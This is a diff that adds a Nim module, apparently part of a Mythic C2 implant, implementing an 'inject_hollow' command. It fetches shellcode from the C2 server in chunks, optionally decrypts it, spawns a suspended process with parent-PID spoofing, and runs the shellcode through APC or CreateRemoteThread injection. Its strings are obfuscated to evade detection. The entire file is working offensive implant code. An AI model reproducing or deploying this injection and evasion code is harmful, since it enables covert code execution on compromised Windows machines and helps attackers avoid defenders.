@@ -1,0 +1,375 @@
+import ../utils/m_responses
+import ../utils/debug
+import ../global_data
+import ../utils/crypto
+import ../utils/strenc
+import std/[json, strutils, strformat, base64]
+
+when defined(windows):
+  import winim/lean
+  
+  const
+    PROCESS_CREATE_PROCESS = 0x0080
+    PROCESS_QUERY_INFORMATION = 0x0400
+    EXTENDED_STARTUPINFO_PRESENT = 0x00080000
+    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
+  
+  type
+    PROC_THREAD_ATTRIBUTE_LIST = object
+    LPPROC_THREAD_ATTRIBUTE_LIST = ptr PROC_THREAD_ATTRIBUTE_LIST
+    
+    STARTUPINFOEXA = object
+      StartupInfo: STARTUPINFOA
+      lpAttributeList: LPPROC_THREAD_ATTRIBUTE_LIST
+  
+  proc InitializeProcThreadAttributeList(lpAttributeList: LPPROC_THREAD_ATTRIBUTE_LIST, 
+                                         dwAttributeCount: DWORD, dwFlags: DWORD, 
+                                         lpSize: ptr SIZE_T): WINBOOL
+    {.importc, dynlib: obf("kernel32.dll"), stdcall.}
+  
+  proc UpdateProcThreadAttribute(lpAttributeList: LPPROC_THREAD_ATTRIBUTE_LIST,
+                                dwFlags: DWORD, Attribute: DWORD_PTR, 
+                                lpValue: PVOID, cbSize: SIZE_T,
+                                lpPreviousValue: PVOID, lpReturnSize: ptr SIZE_T): WINBOOL
+    {.importc, dynlib: obf("kernel32.dll"), stdcall.}
+  
+  proc DeleteProcThreadAttributeList(lpAttributeList: LPPROC_THREAD_ATTRIBUTE_LIST): void
+    {.importc, dynlib: obf("kernel32.dll"), stdcall.}
+
+type
+  InjectHollowArgs = object
+    uuid: string
+    shellcode_name: string
+    technique: string
+    encryption: string
+    key: string
+    iv: string
+    nonce: string
+
+when defined(windows):
+  proc createSuspendedProcess(spawntoPath: string, ppid: uint32): tuple[success: bool, pi: PROCESS_INFORMATION, error: string] =
+    ## Create a suspended process with optional PPID spoofing
+    var pi: PROCESS_INFORMATION
+    
+    if ppid != 0:
+      # PPID spoofing - use extended process creation
+      let parentHandle = OpenProcess(PROCESS_CREATE_PROCESS or PROCESS_QUERY_INFORMATION, 0, DWORD(ppid))
+      if parentHandle == 0:
+        return (false, pi, obf("Failed to open parent process: ") & $GetLastError())
+      
+      # Initialize attribute list
+      var size: SIZE_T = 0
+      discard InitializeProcThreadAttributeList(nil, 1, 0, addr size)
+      
+      var attrList = newSeq[byte](size)
+      let attrListPtr = cast[LPPROC_THREAD_ATTRIBUTE_LIST](addr attrList[0])
+      
+      if InitializeProcThreadAttributeList(attrListPtr, 1, 0, addr size) == 0:
+        CloseHandle(parentHandle)
+        return (false, pi, obf("Failed to initialize attribute list: ") & $GetLastError())
+      
+      # Update attribute with parent process handle
+      if UpdateProcThreadAttribute(attrListPtr, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
+                                   addr parentHandle, SIZE_T(sizeof(HANDLE)), nil, nil) == 0:
+        DeleteProcThreadAttributeList(attrListPtr)
+        CloseHandle(parentHandle)
+        return (false, pi, obf("Failed to update attribute list: ") & $GetLastError())
+      
+      # Create process with extended startup info
+      var siEx: STARTUPINFOEXA
+      siEx.StartupInfo.cb = sizeof(STARTUPINFOEXA).DWORD
+      siEx.lpAttributeList = attrListPtr
+      
+      let success = CreateProcessA(
+        spawntoPath,
+        nil,
+        nil,
+        nil,
+        FALSE,
+        CREATE_SUSPENDED or EXTENDED_STARTUPINFO_PRESENT,
+        nil,
+        nil,
+        addr siEx.StartupInfo,
+        addr pi
+      )
+      
+      DeleteProcThreadAttributeList(attrListPtr)
+      CloseHandle(parentHandle)
+      
+      if success == 0:
+        return (false, pi, obf("Failed to create process with PPID spoofing: ") & $GetLastError())
+    else:
+      # Normal process creation without PPID spoofing
+      var si: STARTUPINFOA
+      si.cb = sizeof(STARTUPINFOA).DWORD
+      
+      let success = CreateProcessA(
+        spawntoPath,
+        nil,
+        nil,
+        nil,
+        FALSE,
+        CREATE_SUSPENDED,
+        nil,
+        nil,
+        addr si,
+        addr pi
+      )
+      
+      if success == 0:
+        return (false, pi, obf("Failed to create process: ") & $GetLastError())
+    
+    return (true, pi, "")
+
+proc injectViaAPC(shellcode: seq[byte]): tuple[success: bool, error: string] =
+  ## Inject shellcode using QueueUserAPC technique
+  when defined(windows):
+    try:
+      # Validate shellcode
+      if shellcode.len == 0:
+        return (false, obf("Shellcode is empty (0 bytes)"))
+      
+      # Get spawnto path based on architecture
+      when hostCPU == "amd64":
+        let (spawntoPath, spawntoArgs) = getSpawntoX64()
+      else:
+        let (spawntoPath, spawntoArgs) = getSpawntoX86()
+      
+      if spawntoPath.len == 0:
+        return (false, obf("spawnto path is not set for this architecture"))
+      
+      # Get PPID for spoofing
+      let ppid = getPpid()
+      
+      # Create suspended process with optional PPID spoofing
+      let (success, pi, errorMsg) = createSuspendedProcess(spawntoPath, ppid)
+      if not success:
+        return (false, errorMsg)
+      
+      # Allocate memory in target process
+      let pRemote = VirtualAllocEx(
+        pi.hProcess,
+        nil,
+        SIZE_T(shellcode.len),
+        MEM_COMMIT or MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE
+      )
+      
+      if pRemote == nil:
+        let err = GetLastError()
+        discard TerminateProcess(pi.hProcess, 0)
+        CloseHandle(pi.hProcess)
+        CloseHandle(pi.hThread)
+        return (false, obf("VirtualAllocEx failed: ") & $err & obf(" (size: ") & $shellcode.len & obf(" bytes)"))
+      
+      # Write shellcode to target process
+      var bytesWritten: SIZE_T
+      if WriteProcessMemory(pi.hProcess, pRemote, unsafeAddr shellcode[0], SIZE_T(shellcode.len), addr bytesWritten) == 0:
+        let err = GetLastError()
+        discard TerminateProcess(pi.hProcess, 0)
+        CloseHandle(pi.hProcess)
+        CloseHandle(pi.hThread)
+        return (false, obf("WriteProcessMemory failed: ") & $err)
+      
+      # Queue APC to suspended thread
+      if QueueUserAPC(cast[PAPCFUNC](pRemote), pi.hThread, 0) == 0:
+        let err = GetLastError()
+        discard TerminateProcess(pi.hProcess, 0)
+        CloseHandle(pi.hProcess)
+        CloseHandle(pi.hThread)
+        return (false, obf("QueueUserAPC failed: ") & $err)
+      
+      # Resume thread to execute APC
+      discard ResumeThread(pi.hThread)
+      
+      CloseHandle(pi.hProcess)
+      CloseHandle(pi.hThread)
+      return (true, "")
+      
+    except Exception as e:
+      return (false, "Exception: " & e.msg)
+  else:
+    return (false, obf("Not on Windows"))
+
+proc injectViaCreateRemoteThread(shellcode: seq[byte]): tuple[success: bool, error: string] =
+  ## Inject shellcode using CreateRemoteThread technique
+  when defined(windows):
+    try:
+      # Validate shellcode
+      if shellcode.len == 0:
+        return (false, obf("Shellcode is empty (0 bytes)"))
+      
+      # Get spawnto path based on architecture
+      when hostCPU == "amd64":
+        let (spawntoPath, spawntoArgs) = getSpawntoX64()
+      else:
+        let (spawntoPath, spawntoArgs) = getSpawntoX86()
+      
+      if spawntoPath.len == 0:
+        return (false, obf("spawnto path is not set for this architecture"))
+      
+      # Get PPID for spoofing
+      let ppid = getPpid()
+      
+      # Create suspended process with optional PPID spoofing
+      let (success, pi, errorMsg) = createSuspendedProcess(spawntoPath, ppid)
+      if not success:
+        return (false, errorMsg)
+      
+      # Allocate memory in target process
+      let pRemote = VirtualAllocEx(
+        pi.hProcess,
+        nil,
+        SIZE_T(shellcode.len),
+        MEM_COMMIT or MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE
+      )
+      
+      if pRemote == nil:
+        let err = GetLastError()
+        discard TerminateProcess(pi.hProcess, 0)
+        CloseHandle(pi.hProcess)
+        CloseHandle(pi.hThread)
+        return (false, obf("VirtualAllocEx failed: ") & $err & obf(" (size: ") & $shellcode.len & obf(" bytes)"))
+      
+      # Write shellcode to target process
+      var bytesWritten: SIZE_T
+      if WriteProcessMemory(pi.hProcess, pRemote, unsafeAddr shellcode[0], SIZE_T(shellcode.len), addr bytesWritten) == 0:
+        let err = GetLastError()
+        discard TerminateProcess(pi.hProcess, 0)
+        CloseHandle(pi.hProcess)
+        CloseHandle(pi.hThread)
+        return (false, obf("WriteProcessMemory failed: ") & $err)
+      
+      # Create remote thread
+      var threadId: DWORD
+      let hRemoteThread = CreateRemoteThread(
+        pi.hProcess,
+        nil,
+        0,
+        cast[LPTHREAD_START_ROUTINE](pRemote),
+        nil,
+        0,
+        addr threadId
+      )
+      
+      if hRemoteThread == 0:
+        let err = GetLastError()
+        discard TerminateProcess(pi.hProcess, 0)
+        CloseHandle(pi.hProcess)
+        CloseHandle(pi.hThread)
+        return (false, obf("CreateRemoteThread failed: ") & $err)
+      
+      CloseHandle(hRemoteThread)
+      CloseHandle(pi.hProcess)
+      CloseHandle(pi.hThread)
+      return (true, "")
+      
+    except Exception as e:
+      return (false, "Exception: " & e.msg)
+  else:
+    return (false, obf("Not on Windows"))
+
+proc executeInjectHollow*(taskId: string, shellcode: seq[byte], params: JsonNode): JsonNode
+
+proc injectHollow*(taskId: string, params: JsonNode): JsonNode =
+  ## Inject shellcode into a remote process using process hollowing
+  when defined(windows):
+    try:
+      let args = to(params, InjectHollowArgs)
+      
+      debug &"[DEBUG] Inject hollow: {args.shellcode_name}"
+      debug &"[DEBUG] Technique: {args.technique}"
+      debug &"[DEBUG] UUID for download: {args.uuid}"
+      
+      # Return initial response - request the file from Mythic
+      return %*{
+        obf("task_id"): taskId,
+        obf("upload"): {
+          obf("file_id"): args.uuid,
+          obf("chunk_num"): 1,
+          obf("chunk_size"): 512000,
+          obf("full_path"): ""
+        }
+      }
+      
+    except Exception as e:
+      return mythicError(taskId, obf("Inject hollow error: ") & e.msg)
+  else:
+    return mythicError(taskId, obf("inject_hollow command is only available on Windows"))
+
+proc processInjectHollowChunk*(taskId: string, params: JsonNode, chunkData: string, 
+                               totalChunks: int, currentChunk: int, 
+                               fileData: var seq[byte]): JsonNode =
+  ## Process a chunk of the shellcode file being downloaded
+  when defined(windows):
+    try:
+      let args = to(params, InjectHollowArgs)
+      
+      # Decode and append chunk data
+      let decodedChunk = decode(chunkData)
+      for b in decodedChunk:
+        fileData.add(cast[byte](b))
+      
+      debug &"[DEBUG] Inject hollow: Received chunk {currentChunk}/{totalChunks}, accumulated {fileData.len} bytes"
+      
+      # If more chunks remain, request the next one
+      if currentChunk < totalChunks:
+        return %*{
+          obf("task_id"): taskId,
+          obf("upload"): {
+            obf("chunk_size"): 512000,
+            obf("file_id"): args.uuid,
+            obf("chunk_num"): currentChunk + 1,
+            obf("full_path"): ""
+          }
+        }
+      
+      # All chunks received - execute the injection
+      return executeInjectHollow(taskId, fileData, params)
+      
+    except Exception as e:
+      return mythicError(taskId, obf("Inject hollow chunk processing error: ") & e.msg)
+  else:
+    return mythicError(taskId, obf("inject_hollow command is only available on Windows"))
+
+proc executeInjectHollow*(taskId: string, shellcode: seq[byte], params: JsonNode): JsonNode =
+  ## Execute the shellcode injection after download is complete
+  when defined(windows):
+    try:
+      let args = to(params, InjectHollowArgs)
+      
+      # Validate shellcode was received
+      if shellcode.len == 0:
+        return mythicError(taskId, obf("Shellcode is empty - file download may have failed"))
+      
+      var finalShellcode = shellcode
+      # Decrypt shellcode if encryption is specified
+      if args.encryption != "" and args.encryption != "none":
+        debug &"[*] Decrypting shellcode with {args.encryption}..."
+        try:
+          decryptPayload(finalShellcode, args.encryption, args.key, args.iv, args.nonce)
+          debug &"[+] Decryption successful ({finalShellcode.len} bytes)"
+        except Exception as e:
+          return mythicError(taskId, obf("Decryption failed: ") & e.msg)
+      
+      debug &"[DEBUG] Injecting shellcode ({finalShellcode.len} bytes) via {args.technique}"
+      
+      var result: tuple[success: bool, error: string]
+      case args.technique.toLower():
+      of obf("apc"):
+        result = injectViaAPC(finalShellcode)
+      of obf("createremotethread"):
+        result = injectViaCreateRemoteThread(finalShellcode)
+      else:
+        return mythicError(taskId, obf("Unknown injection technique: ") & args.technique)
+      
+      if result.success:
+        return mythicSuccess(taskId, obf("Shellcode injected successfully via ") & args.technique)
+      else:
+        return mythicError(taskId, obf("Failed to inject shellcode via ") & args.technique & ": " & result.error)
+      
+    except Exception as e:
+      return mythicError(taskId, obf("Inject hollow execution error: ") & e.msg)
+  else:
+    return mythicError(taskId, obf("inject_hollow command is only available on Windows"))
